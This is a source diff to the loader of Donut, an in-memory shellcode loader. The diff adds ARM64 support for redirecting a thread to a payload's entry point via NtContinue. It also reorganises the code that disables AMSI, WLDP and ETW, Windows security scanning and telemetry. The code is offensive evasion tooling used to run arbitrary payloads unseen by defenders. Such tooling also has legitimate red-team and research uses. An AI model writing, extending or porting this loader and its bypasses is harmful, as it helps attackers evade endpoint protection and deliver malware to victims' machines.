@@ -31,6 +31,20 @@
 
 #include "loader.h"
 
+static LONG LoaderIncrement(LONG volatile *value)
+{
+    LONG v = *value + 1;
+    *value = v;
+    return v;
+}
+
+static LONG LoaderDecrement(LONG volatile *value)
+{
+    LONG v = *value - 1;
+    *value = v;
+    return v;
+}
+
 DWORD MainProc(PDONUT_INSTANCE inst);
 
 HANDLE DonutLoader(PDONUT_INSTANCE inst) {
@@ -77,16 +91,27 @@ HANDLE DonutLoader(PDONUT_INSTANCE inst) {
       // get the base address of the host process's executable
       host = inst->api.GetModuleHandle(NULL);
       
-      if(_NtContinue != NULL && _GetThreadContext != NULL && _GetCurrentThread != NULL) {
+      if(_NtContinue != NULL && _GetThreadContext != NULL && _GetCurrentThread != NULL) 
+      {
         c.ContextFlags = CONTEXT_FULL;
         _GetThreadContext(_GetCurrentThread(), &c);
-        #ifdef _WIN64
-          c.Rip = RVA2VA(DWORD64, host, inst->oep);
-          c.Rsp &= -16;
-        #else
-          c.Eip = RVA2VA(DWORD64, host, inst->oep);
-          c.Esp &= -4;
-        #endif
+        
+#if defined(_M_ARM64) || defined(__aarch64__)
+        c.Pc = (DWORD64)RVA2VA(DWORD64, host, inst->oep);
+        c.Sp &= ~0xFULL;   // 16-byte stack alignment on ARM64
+
+#elif defined(_M_X64) || defined(__x86_64__)
+        c.Rip = (DWORD64)RVA2VA(DWORD64, host, inst->oep);
+        c.Rsp &= ~0xFULL;  // 16-byte stack alignment on x64
+
+#elif defined(_M_IX86) || defined(__i386__)
+        c.Eip = (DWORD)RVA2VA(DWORD64, host, inst->oep);
+        c.Esp &= ~0x3UL;   // 4-byte stack alignment on x86
+
+#else
+        #error Unsupported architecture
+#endif
+
         DPRINT("Calling NtContinue");
         //__debugbreak();
         _NtContinue(&c, FALSE);
@@ -239,14 +264,9 @@ DWORD MainProc(PDONUT_INSTANCE inst) {
       mod = (PDONUT_MODULE)&inst->module.x;
     }
     
-    // try bypassing AMSI, WLDP, and ETW?
-    if(inst->bypass != DONUT_BYPASS_NONE) {
-      // Try to disable AMSI
-      disabled = DisableAMSI(inst);
-      DPRINT("DisableAMSI %s", disabled ? "OK" : "FAILED");
-      if(!disabled && inst->bypass == DONUT_BYPASS_ABORT) 
-        goto erase_memory;
-      
+    // try bypassing WLDP, and ETW, the AMSI patch is only trigger for dotnet
+    if(inst->bypass != DONUT_BYPASS_NONE) 
+    {      
       // Try to disable WLDP
       disabled = DisableWLDP(inst);
       DPRINT("DisableWLDP %s", disabled ? "OK" : "FAILED");
@@ -373,9 +393,9 @@ erase_memory:
     return 0;
 }
 
-int ansi2unicode(PDONUT_INSTANCE inst, CHAR input[], WCHAR output[DONUT_MAX_NAME]) {
+int ansi2unicode(PDONUT_INSTANCE inst, CHAR input[], WCHAR output[DONUT_MAX_NAME_ARG]) {
     return inst->api.MultiByteToWideChar(CP_ACP, 0, input, 
-      -1, output, DONUT_MAX_NAME);
+      -1, output, DONUT_MAX_NAME_ARG);
 }
 
 #include "peb.c"             // resolve functions in export table
